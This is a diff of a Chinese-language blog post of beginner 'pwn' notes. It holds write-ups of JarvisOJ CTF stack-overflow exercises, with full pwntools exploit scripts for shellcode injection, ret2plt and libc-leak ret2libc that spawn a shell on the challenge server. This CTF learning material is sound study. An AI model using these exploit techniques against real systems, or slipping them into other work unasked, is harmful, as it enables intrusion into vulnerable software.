@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="二进制安全," />
+  <meta name="keywords" content="二进制安全、pwn," />
 
 
 
@@ -96,21 +96,19 @@
 
 
 
-<meta name="description" content="pwn爷爷linux_x86   JarvisOJ-Pwn-[XMAN]level1  JarvisOJ-Pwn-[XMAN]level2  JarvisOJ-Pwn-[XMAN]level3  JarvisOJ-Pwn-[XMAN]level4  linux_x64   JarvisOJ-Pwn-[XMAN]level0  JarvisOJ-Pwn-[XMAN]level1(X64)">
-<meta name="keywords" content="二进制安全">
+<meta name="description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4">
+<meta name="keywords" content="二进制安全、pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【pwn】入门笔记">
 <meta property="og:url" content="http://yoursite.com/【pwn】入门笔记/index.html">
 <meta property="og:site_name" content="wyx&#39;s blog">
-<meta property="og:description" content="pwn爷爷linux_x86   JarvisOJ-Pwn-[XMAN]level1  JarvisOJ-Pwn-[XMAN]level2  JarvisOJ-Pwn-[XMAN]level3  JarvisOJ-Pwn-[XMAN]level4  linux_x64   JarvisOJ-Pwn-[XMAN]level0  JarvisOJ-Pwn-[XMAN]level1(X64)">
+<meta property="og:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/【pwn】入门笔记/1531318071045.png">
-<meta property="og:image" content="http://yoursite.com/【pwn】入门笔记/1531314723826.png">
-<meta property="og:image" content="http://yoursite.com/【pwn】入门笔记/1531317976166.png">
-<meta property="og:updated_time" content="2018-08-02T05:00:29.589Z">
+<meta property="og:updated_time" content="2018-08-06T12:53:55.223Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【pwn】入门笔记">
-<meta name="twitter:description" content="pwn爷爷linux_x86   JarvisOJ-Pwn-[XMAN]level1  JarvisOJ-Pwn-[XMAN]level2  JarvisOJ-Pwn-[XMAN]level3  JarvisOJ-Pwn-[XMAN]level4  linux_x64   JarvisOJ-Pwn-[XMAN]level0  JarvisOJ-Pwn-[XMAN]level1(X64)">
+<meta name="twitter:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4">
 <meta name="twitter:image" content="http://yoursite.com/【pwn】入门笔记/1531318071045.png">
 
 
@@ -334,8 +332,8 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-08-02T13:00:29+08:00">
-                2018-08-02
+              <time title="更新于" itemprop="dateModified" datetime="2018-08-06T20:53:55+08:00">
+                2018-08-06
               </time>
             
           </span>
@@ -368,47 +366,28 @@
       
 
       
-        <h1 id="pwn爷爷"><a href="#pwn爷爷" class="headerlink" title="pwn爷爷"></a>pwn爷爷</h1><p>linux_x86</p>
-<ul>
-<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-[XMAN]level1</li>
-<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-[XMAN]level2</li>
-<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-[XMAN]level3</li>
-<li style="list-style: none"><input type="checkbox"> JarvisOJ-Pwn-[XMAN]level4</li>
-</ul>
-<p>linux_x64</p>
-<ul>
-<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-[XMAN]level0</li>
-<li style="list-style: none"><input type="checkbox"> JarvisOJ-Pwn-[XMAN]level1(X64)</li>
+        <h1 id="Linux-x86"><a href="#Linux-x86" class="headerlink" title="Linux-x86"></a>Linux-x86</h1><ul>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level1</li>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level2</li>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level3</li>
+<li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level4</li>
 </ul>
 <a id="more"></a>
 <h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><blockquote>
 <p>待施工…</p>
 </blockquote>
-<ul>
-<li>栈溢出</li>
-<li>格式化字符串</li>
-<li>堆溢出</li>
-</ul>
-<h3 id="linux-x86"><a href="#linux-x86" class="headerlink" title="linux_x86"></a>linux_x86</h3><ul>
-<li>DEP</li>
-<li>Ret2libc绕过DEP</li>
-<li>ASLR</li>
-</ul>
-<h2 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h2><h3 id="Linux-x86"><a href="#Linux-x86" class="headerlink" title="Linux_x86"></a>Linux_x86</h3><h4 id="JarvisOJ-level1"><a href="#JarvisOJ-level1" class="headerlink" title="JarvisOJ level1"></a>JarvisOJ level1</h4><p>​    发现问题函数</p>
+<h2 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h2><h3 id="JarvisOJ-level1"><a href="#JarvisOJ-level1" class="headerlink" title="JarvisOJ level1"></a>JarvisOJ level1</h3><p>​    发现问题函数</p>
 <img src="/【pwn】入门笔记/1531318071045.png" title="x86_level1">
 <p>​    计算得到会溢出的位数为0x8C，并未发现callsystem之类的函数，需要自己构造shellcode。编写攻击代码如下</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9877'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">get_addr = r.recvline()[<span class="number">14</span>:<span class="number">-2</span>]</span><br><span class="line">addr = int(get_addr,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = shellcode+<span class="string">'A'</span>*(<span class="number">0x8c</span>-len(shellcode))+p32(addr)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h4 id="JarvisOJ-level2"><a href="#JarvisOJ-level2" class="headerlink" title="JarvisOJ level2"></a>JarvisOJ level2</h4><p>​    IDA查看，老办法看溢出位数为0x8c，该程序中存在System函数和‘/bin/sh’字符串，直接调用它们，这里要注意函数传参的方式，在x86中函数的参数是直接通过栈来传递的。所以如果要将’/bin/sh’作为参数传递给system，就要将该字符串的地址放在返回地址之后，返回地址垃圾填充，上一帧的ebp用system的地址填充，得到如下exp函数。</p>
+<h3 id="JarvisOJ-level2"><a href="#JarvisOJ-level2" class="headerlink" title="JarvisOJ level2"></a>JarvisOJ level2</h3><p>​    该程序中存在System函数和‘/bin/sh’字符串，直接调用它们，在x86中函数的参数是直接通过栈来传递的，第一个参数是ebp+0x8，在构造payload的时候注意参数的配置。并且由于延迟绑定技术，.plt段中的内容是实现跳转操作的代码片段，所以system函数的地址可以通过查看plt表获得。综上，得到如下exp函数。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9878</span>)</span><br><span class="line"></span><br><span class="line">level2 = ELF(<span class="string">'level2'</span>)</span><br><span class="line">system_addr = level2.plt[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment">#system_addr = 0x8048320</span></span><br><span class="line">ret = <span class="string">'a'</span>*<span class="number">4</span></span><br><span class="line">bin_addr = <span class="number">0x804A024</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x8c</span> + p32(system_addr) + ret + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h4 id="JarvisOJ-level3"><a href="#JarvisOJ-level3" class="headerlink" title="JarvisOJ level3"></a>JarvisOJ level3</h4><p>​    这道题目的区别在于程序中没有直接给出system函数和’/bin/sh’字符串，但是.so文件中有我们需要的函数和字符串，而.elf文件中又调用了write函数，所以我们可以结合got表和内存地址的关系计算出system函数和’/bin/sh’的内存位置。</p>
+<h3 id="JarvisOJ-level3"><a href="#JarvisOJ-level3" class="headerlink" title="JarvisOJ level3"></a>JarvisOJ level3</h3><p>​    程序中没有直接给出system函数和’/bin/sh’字符串，但是.so文件中有我们需要的函数和字符串。并且这个程序调用过write函数，我们知道由于延迟绑定技术，可执行文件中的.got和.plt中的地址并不是目标地址，而是动态连接器中的地址。在程序执行的第一次调用时，动态链接器才把got表和plt表中的地址填写正确。所以我们要泄露出write函数的地址，再结合偏移地址和内存地址的关系计算出system函数和’/bin/sh’的地址。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line">level3 = ELF(<span class="string">'level3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.19.so'</span>)</span><br><span class="line"></span><br><span class="line">write_plt = level3.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = level3.got[<span class="string">'write'</span>]</span><br><span class="line">ret = <span class="number">0x804844B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x8c</span> + p32(write_plt) + p32(ret) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">write_libc = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">sh_libc = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">system_addr = write_addr-write_libc+system_libc</span><br><span class="line">sh_addr = write_addr-write_libc+sh_libc</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'A'</span>*<span class="number">0x8c</span> + p32(system_addr) + <span class="string">"aaaa"</span> + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h3 id="Linux-x64"><a href="#Linux-x64" class="headerlink" title="Linux_x64"></a>Linux_x64</h3><h4 id="JarvisOJ-level0"><a href="#JarvisOJ-level0" class="headerlink" title="JarvisOJ level0"></a>JarvisOJ level0</h4><p>​    发现问题函数，read函数有0x200大小.。</p>
-<img src="/【pwn】入门笔记/1531314723826.png" title="x64_level0_1">
-<p>​    再看堆栈分配情况0x8-(-0x80)为0x88&lt;0x200，会发生栈溢出</p>
-<img src="/【pwn】入门笔记/1531317976166.png" title="x64_level0_2">
-<p>​    发现callsystem函数，函数地址为0x400596，对应的小端序为：\x96\x05\x40\x00；于是可以构造payload=0x88*‘a’ + “\x96\x05\x40\x00”，于是用pwntools编写攻击代码</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="string">'9881'</span>)</span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + <span class="string">"\x96\x05\x40\x00"</span></span><br><span class="line"><span class="comment">#addr  = p64(0x400596)</span></span><br><span class="line"><span class="comment">#payload = 0x88*'a'</span></span><br><span class="line"><span class="comment">#payload = payload+addr</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<p>### </p>
+<h3 id="JarvisOJ-level4"><a href="#JarvisOJ-level4" class="headerlink" title="JarvisOJ level4"></a>JarvisOJ level4</h3><p>​    在未能得到程序调用的libc文件的情况下，我们就需要通过泄露内存的手段来获取libc中某函数的地址，然后通过版本对比得到其它函数或字符串的偏移量达到调用system(‘/bin/sh’)的目的。</p>
+<p>​    这道题目并没有给出libc文件，首先通过payload1调用write函数输出libc中某个函数得实际地址，在下面代码中使用得write函数。然后通过LibcSearcher得到对应libc得版本号，从而获得system函数和”/bin/sh”字符串的相对地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = hex(u32(p.recv(<span class="number">4</span>)))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">offset_system = obj.dump(<span class="string">"system"</span>)</span><br><span class="line">offset_binsh = obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">offset_write = obj.dump(<span class="string">"write"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - offset_write + offset_system</span><br><span class="line">binsh_addr = write_addr - offset_write + offset_binsh</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr) + <span class="string">"aaaa"</span> + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>​     </p>
 
       
     </div>
@@ -426,7 +405,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/二进制安全/" rel="tag"># 二进制安全</a>
+            <a href="/tags/二进制安全、pwn/" rel="tag"># 二进制安全、pwn</a>
           
         </div>
       
@@ -528,7 +507,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-count">8</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -541,7 +520,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">5</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -605,7 +584,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn爷爷"><span class="nav-text">pwn爷爷</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本原理"><span class="nav-text">基本原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux-x86"><span class="nav-text">linux_x86</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#练习题"><span class="nav-text">练习题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-x86"><span class="nav-text">Linux_x86</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JarvisOJ-level1"><span class="nav-text">JarvisOJ level1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JarvisOJ-level2"><span class="nav-text">JarvisOJ level2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#JarvisOJ-level3"><span class="nav-text">JarvisOJ level3</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Linux-x64"><span class="nav-text">Linux_x64</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JarvisOJ-level0"><span class="nav-text">JarvisOJ level0</span></a></li></ol></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-x86"><span class="nav-text">Linux-x86</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本原理"><span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#练习题"><span class="nav-text">练习题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level1"><span class="nav-text">JarvisOJ level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level2"><span class="nav-text">JarvisOJ level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level3"><span class="nav-text">JarvisOJ level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level4"><span class="nav-text">JarvisOJ level4</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
